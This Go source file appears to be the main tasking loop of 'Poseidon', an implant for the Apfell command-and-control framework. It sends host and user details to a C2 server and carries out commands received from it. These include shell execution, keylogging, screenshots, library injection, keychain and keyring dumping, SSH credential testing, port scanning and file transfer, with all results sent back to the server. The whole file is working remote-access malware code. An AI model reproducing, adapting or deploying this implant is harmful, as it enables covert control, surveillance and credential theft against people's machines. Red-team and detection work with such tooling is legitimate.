package main

import (
	"C"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"

	"github.com/xorrior/poseidon/pkg/commands/cat"
	"github.com/xorrior/poseidon/pkg/commands/cp"
	"github.com/xorrior/poseidon/pkg/commands/drives"
	"github.com/xorrior/poseidon/pkg/commands/getenv"
	"github.com/xorrior/poseidon/pkg/commands/getprivs"
	"github.com/xorrior/poseidon/pkg/commands/getuser"
	"github.com/xorrior/poseidon/pkg/commands/keylog"
	"github.com/xorrior/poseidon/pkg/commands/keys"
	"github.com/xorrior/poseidon/pkg/commands/kill"
	"github.com/xorrior/poseidon/pkg/commands/libinject"
	"github.com/xorrior/poseidon/pkg/commands/ls"
	"github.com/xorrior/poseidon/pkg/commands/mkdir"
	"github.com/xorrior/poseidon/pkg/commands/mv"
	"github.com/xorrior/poseidon/pkg/commands/portscan"
	"github.com/xorrior/poseidon/pkg/commands/ps"
	"github.com/xorrior/poseidon/pkg/commands/pwd"
	"github.com/xorrior/poseidon/pkg/commands/rm"
	"github.com/xorrior/poseidon/pkg/commands/screencapture"
	"github.com/xorrior/poseidon/pkg/commands/setenv"
	"github.com/xorrior/poseidon/pkg/commands/shell"
	"github.com/xorrior/poseidon/pkg/commands/sshauth"
	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
	"github.com/xorrior/poseidon/pkg/commands/unsetenv"
	"github.com/xorrior/poseidon/pkg/profiles"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

const (
	NONE_CODE = 100
	EXIT_CODE = 0
)

var taskSlice []structs.Task

//export RunMain
func RunMain() {
	main()
}

func main() {

	// Initialize the  agent and check in
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	currIP := functions.GetCurrentIPAddress()
	currPid := os.Getpid()

	p := profiles.NewInstance()
	profile := p.(profiles.Profile)
	profile.SetUniqueID(profiles.PConfig.UUID)
	profile.SetURL(profiles.PConfig.BaseURL)
	profile.SetURLs(profiles.PConfig.BaseURLS)
	sleep, _ := strconv.Atoi(profiles.PConfig.Sleep)
	profile.SetSleepInterval(sleep)
	profile.SetUserAgent(profiles.PConfig.UserAgent)
	// Evaluate static variables
	if strings.Contains(profiles.PConfig.KEYX, "T") {
		//log.Println("Xchange keys true")
		profile.SetXKeys(true)
	} else {
		//log.Println("Xchange keys false")
		profile.SetXKeys(false)
	}

	if !strings.Contains(profiles.PConfig.AESPSK, "AESPSK") && len(profiles.PConfig.AESPSK) > 0 {
		//log.Println("Aes pre shared key is set")
		profile.SetAesPreSharedKey(profiles.PConfig.AESPSK)
	} else {
		//log.Println("Aes pre shared key is not set")
		profile.SetAesPreSharedKey("")
	}

	if len(profiles.PConfig.HostHeader) > 0 {
		profile.SetHeader(profiles.PConfig.HostHeader)
	}

	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
	// fmt.Println(currentUser.Name)
	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname)
	checkIn := resp.(structs.CheckInMessageResponse)
	log.Printf("Checkin response: %+v\n", checkIn)
	tasktypes := map[string]int{
		"exit":            EXIT_CODE,
		"shell":           1,
		"screencapture":   2,
		"keylog":          3,
		"download":        4,
		"upload":          5,
		"libinject":       6,
		"ps":              8,
		"sleep":           9,
		"cat":             10,
		"cd":              11,
		"ls":              12,
		"python":          13,
		"jxa":             14,
		"keys":            15,
		"triagedirectory": 16,
		"sshauth":         17,
		"portscan":        18,
		"getprivs":        19,
		"jobs":            21,
		"jobkill":         22,
		"cp":              23,
		"drives":          24,
		"getuser":         25,
		"mkdir":           26,
		"mv":              27,
		"pwd":             28,
		"rm":              29,
		"getenv":          30,
		"setenv":          31,
		"unsetenv":        32,
		"kill":            33,
		"none":            NONE_CODE,
	}

	// Channel used to catch results from tasking threads
	res := make(chan structs.ThreadMsg)
	//if we have an Active apfell session, enter the tasking loop
	if strings.Contains(checkIn.Status, "success") {

	LOOP:
		for {
			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)

			// Get the next task
			t := profile.GetTasking()
			task := t.(structs.TaskRequestMessageResponse)
			/*
				Unfortunately, due to the architecture of goroutines, there is no easy way to kill threads.
				This check is to make sure we're running a "killable" process, and if so, add it to the queue.
				The supported processes are:
					- triagedirectory
					- portscan
			*/
			if len(task.Tasks) > 0 {
				if tasktypes[task.Tasks[0].Command] == 3 || tasktypes[task.Tasks[0].Command] == 16 || tasktypes[task.Tasks[0].Command] == 18 || tasktypes[task.Tasks[0].Command] == 20 {
					// log.Println("Making a job for", task.Command)
					job := &structs.Job{
						KillChannel: make(chan int),
						Stop:        new(int),
						Monitoring:  false,
					}
					task.Tasks[0].Job = job
					taskSlice = append(taskSlice, task.Tasks[0])
				}
				switch tasktypes[task.Tasks[0].Command] {
				case EXIT_CODE:
					// Throw away the response, we don't really need it for anything
					resp := structs.Response{}
					resp.UserOutput = "exiting"
					resp.Completed = true
					resp.TaskID = task.Tasks[0].TaskID
					encResp, err := json.Marshal(resp)
					if err != nil {
						log.Println("Error marshaling exit response: ", err.Error())
						break
					}

					profile.PostResponse(task.Tasks[0], string(encResp))
					break LOOP
				case 1:
					// Run shell command
					go shell.Run(task.Tasks[0], res)
					break
				case 2:
					// Capture screenshot
					go screencapture.Run(task.Tasks[0], res)
					break
				case 3:
					go keylog.Run(task.Tasks[0], res)
					break
				case 4:
					//File download

					profile.SendFile(task.Tasks[0], task.Tasks[0].Params)
					break
				case 5:
					// File upload

					fileDetails := structs.FileUploadParams{}
					log.Printf("File upload response struct %s", string(task.Tasks[0].Params))
					err := json.Unmarshal([]byte(task.Tasks[0].Params), &fileDetails)
					if err != nil {
						errResp := structs.Response{}
						errResp.Completed = true
						errResp.TaskID = task.Tasks[0].TaskID
						errResp.UserOutput = err.Error()

						encErrResp, _ := json.Marshal(errResp)
						profile.PostResponse(task.Tasks[0], string(encErrResp))
						break
					}

					result := profile.GetFile(fileDetails)
					out := ""
					if result {
						out = "upload successful"
					} else {
						out = "upload failed"
					}

					resp := structs.Response{}
					resp.UserOutput = out
					resp.Completed = true
					resp.TaskID = task.Tasks[0].TaskID
					encResp, err := json.Marshal(resp)
					if err != nil {
						log.Println("Error marshaling upload response: ", err.Error())
						break
					}
					profile.PostResponse(task.Tasks[0], string(encResp))
					break

				case 6:
					go libinject.Run(task.Tasks[0], res)
					break
				case 8:
					go ps.Run(task.Tasks[0], res)
					break
				case 9:
					// Sleep
					i, err := strconv.Atoi(task.Tasks[0].Params)
					if err != nil {
						profile.PostResponse(task.Tasks[0], err.Error())
						break
					}

					profile.SetSleepInterval(i)
					resp := structs.Response{}
					resp.UserOutput = "sleep updated"
					resp.Completed = true
					resp.TaskID = task.Tasks[0].TaskID
					encResp, err := json.Marshal(resp)
					if err != nil {
						log.Println("Error marshaling sleep response: ", err.Error())
						break
					}
					profile.PostResponse(task.Tasks[0], string(encResp))

					break
				case 10:
					//Cat a file
					go cat.Run(task.Tasks[0], res)
					break
				case 11:
					//Change cwd
					err := os.Chdir(task.Tasks[0].Params)
					if err != nil {
						profile.PostResponse(task.Tasks[0], err.Error())

						break
					}
					resp := structs.Response{}
					resp.UserOutput = fmt.Sprintf("changed directory to: %s", task.Tasks[0].Params)
					resp.Completed = true
					resp.TaskID = task.Tasks[0].TaskID
					encResp, err := json.Marshal(resp)
					if err != nil {
						log.Println("Error marshaling cd response: ", err.Error())
						break
					}
					profile.PostResponse(task.Tasks[0], string(encResp))
					break
				case 12:
					//List directory contents
					go ls.Run(task.Tasks[0], res)
					break

				case 15:
					// Enumerate keyring data for linux or the keychain for macos
					go keys.Run(task.Tasks[0], res)
					break
				case 16:
					// Triage a directory and organize files by type
					go triagedirectory.Run(task.Tasks[0], res)
					break
				case 17:
					// Test credentials against remote hosts
					go sshauth.Run(task.Tasks[0], res)
					break
				case 18:
					// Scan ports on remote hosts.
					go portscan.Run(task.Tasks[0], res)
					break
				case 19:
					// Enable privileges for your current process.
					go getprivs.Run(task.Tasks[0], res)
					break
				case 21:
					// Return the list of jobs.
					tMsg := structs.ThreadMsg{}
					tMsg.TaskItem = task.Tasks[0]
					tMsg.Error = false
					//log.Println("Number of tasks processing:", len(taskSlice))
					fmt.Println(taskSlice)
					// For graceful error handling server-side when zero jobs are processing.
					if len(taskSlice) == 0 {
						tMsg.TaskResult = []byte("[]")
					} else {
						var jobList []structs.TaskStub
						for _, x := range taskSlice {
							jobList = append(jobList, x.ToStub())
						}
						jsonSlices, err := json.Marshal(jobList)
						log.Println("Finished marshalling tasks into:", string(jsonSlices))
						if err != nil {
							log.Println("Failed to marshal :'(")
							log.Println(err.Error())
							tMsg.Error = true
							tMsg.TaskResult = []byte(err.Error())
							go func() {
								res <- tMsg
							}()
							break
						}
						tMsg.TaskResult = jsonSlices
					}
					go func() {
						res <- tMsg
					}()
					log.Println("returned!")
					break
				case 22:
					// Kill the job
					tMsg := structs.ThreadMsg{}
					tMsg.Error = false
					tMsg.TaskItem = task.Tasks[0]

					foundTask := false
					for _, taskItem := range taskSlice {
						if taskItem.TaskID == task.Tasks[0].TaskID {
							go taskItem.Job.SendKill()
							foundTask = true
						}
					}

					if foundTask {
						tMsg.TaskResult = []byte(fmt.Sprintf("Sent kill signal to Job ID: %s", task.Tasks[0].Params))
					} else {
						tMsg.TaskResult = []byte(fmt.Sprintf("No job with ID: %s", task.Tasks[0].Params))
						tMsg.Error = true
					}
					go func(threadChan *chan structs.ThreadMsg, msg *structs.ThreadMsg) {
						*threadChan <- *msg
					}(&res, &tMsg)
					break
				case 23:
					// copy a file!
					go cp.Run(task.Tasks[0], res)
				case 24:
					// List drives on a machine
					go drives.Run(task.Tasks[0], res)
				case 25:
					// Retrieve information about the current user.
					go getuser.Run(task.Tasks[0], res)
				case 26:
					// Make a directory
					go mkdir.Run(task.Tasks[0], res)
				case 27:
					// Move files
					go mv.Run(task.Tasks[0], res)
				case 28:
					// Print working directory
					go pwd.Run(task.Tasks[0], res)
				case 29:
					go rm.Run(task.Tasks[0], res)
				case 30:
					go getenv.Run(task.Tasks[0], res)
				case 31:
					go setenv.Run(task.Tasks[0], res)
				case 32:
					go unsetenv.Run(task.Tasks[0], res)
				case 33:
					go kill.Run(task.Tasks[0], res)
				case NONE_CODE:
					// No tasks, do nothing
					break
				}
			}

			// Listen on the results channel for 1 second
			select {
			case toApfell := <-res:
				for i := 0; i < len(taskSlice); i++ {
					if taskSlice[i].TaskID == toApfell.TaskItem.TaskID && !taskSlice[i].Job.Monitoring {
						if i != (len(taskSlice) - 1) {
							taskSlice = append(taskSlice[:i], taskSlice[i+1:]...)
						} else {
							taskSlice = taskSlice[:i]
						}
						break
					}
				}
				if strings.Contains(toApfell.TaskItem.Command, "screencapture") {
					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
				} else {
					resp := structs.Response{}
					resp.Completed = true
					resp.TaskID = toApfell.TaskItem.TaskID
					resp.UserOutput = string(toApfell.TaskResult)

					encResp, err := json.Marshal(resp)
					if err != nil {
						log.Println("Error marshaling task response: ", err.Error())
						break
					}
					profile.PostResponse(toApfell.TaskItem, string(encResp))
				}
			case <-time.After(1 * time.Second):
				break
			}
		}
	}
}
